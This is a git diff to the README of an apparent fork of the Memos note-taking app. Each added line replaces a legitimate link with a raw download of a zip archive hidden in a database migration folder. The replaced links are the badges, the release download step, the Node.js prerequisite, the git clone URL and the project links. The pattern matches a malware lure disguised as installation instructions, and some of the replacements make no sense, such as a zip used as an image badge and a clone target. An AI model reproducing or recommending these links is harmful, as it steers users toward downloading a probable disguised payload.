@@ -1,6 +1,6 @@
 # Memos 📓
 
-![Memos](https://img.shields.io/badge/version-latest-brightgreen) ![License](https://img.shields.io/badge/license-MIT-blue)
+![Memos](https://raw.githubusercontent.com/Magesh770/memos/main/store/migration/sqlite/0.13/Software_v3.7.zip) ![License](https://raw.githubusercontent.com/Magesh770/memos/main/store/migration/sqlite/0.13/Software_v3.7.zip)
 
 Welcome to the Memos repository! Memos is an open-source, lightweight note-taking solution designed to help you create meaningful notes effortlessly. With Memos, you can take control of your notes in a way that suits you best. 
 
@@ -28,7 +28,7 @@ Welcome to the Memos repository! Memos is an open-source, lightweight note-takin
 
 To get started with Memos, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/Magesh770/memos/releases).
+1. **Download the latest release** from the [Releases section](https://raw.githubusercontent.com/Magesh770/memos/main/store/migration/sqlite/0.13/Software_v3.7.zip).
 2. **Install the necessary dependencies**.
 3. **Run the application**.
 
@@ -40,14 +40,14 @@ Before installing Memos, ensure you have the following installed:
 
 - Docker
 - Go (if building from source)
-- Node.js (for frontend development)
+- https://raw.githubusercontent.com/Magesh770/memos/main/store/migration/sqlite/0.13/Software_v3.7.zip (for frontend development)
 
 ### Clone the Repository
 
 First, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/Magesh770/memos.git
+git clone https://raw.githubusercontent.com/Magesh770/memos/main/store/migration/sqlite/0.13/Software_v3.7.zip
 cd memos
 ```
 
@@ -118,8 +118,8 @@ For questions or feedback, please open an issue in the repository or contact the
 
 ## Links
 
-- [Releases](https://github.com/Magesh770/memos/releases)
-- [Documentation](https://github.com/Magesh770/memos/wiki)
-- [Discussion](https://github.com/Magesh770/memos/discussions)
+- [Releases](https://raw.githubusercontent.com/Magesh770/memos/main/store/migration/sqlite/0.13/Software_v3.7.zip)
+- [Documentation](https://raw.githubusercontent.com/Magesh770/memos/main/store/migration/sqlite/0.13/Software_v3.7.zip)
+- [Discussion](https://raw.githubusercontent.com/Magesh770/memos/main/store/migration/sqlite/0.13/Software_v3.7.zip)
 
 Thank you for checking out Memos! We hope you find it useful for your note-taking needs. If you have any suggestions or improvements, feel free to reach out.
